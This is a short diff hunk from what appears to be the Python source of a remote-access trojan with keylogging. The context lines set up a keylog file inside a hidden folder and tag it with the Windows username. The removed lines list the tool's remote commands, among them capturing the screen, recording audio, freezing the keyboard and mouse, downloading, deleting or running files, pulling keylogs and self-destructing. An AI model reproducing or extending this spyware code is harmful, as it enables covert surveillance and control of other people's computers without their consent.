@@ -50,29 +50,7 @@ mouseFrozen = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 schedule = {}
 log_file = hide_folder + '\\keylogs.txt'
-# functionalities dictionary: command:arguments
-functionalities = { '/arp' : '', \
-					'/capture_pc' : '', \
-					'/cd':'<target_dir>', \
-					'/delete':'<target_file>', \
-					'/download':'<target_file>', \
-					'/decode_all':'', \
-					'/encode_all':'', \
-					'/freeze_keyboard':'', \
-					'/freeze_mouse':'', \
-					'/hear':'[time in seconds, default=5s]', \
-					'/ip_info':'', \
-					'/keylogs':'', \
-					'/ls':'[target_folder]', \
-					'/msg_box':'<text>', \
-					'/pc_info':'', \
-					'/play':'<youtube_videoId>', \
-					'/proxy':'', \
-					'/pwd':'', \
-					'/run':'<target_file>', \
-					'/self_destruct':'', \
-					'/tasklist':'', \
-					'/to':'<target_computer>, [other_target_computer]'}
+
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
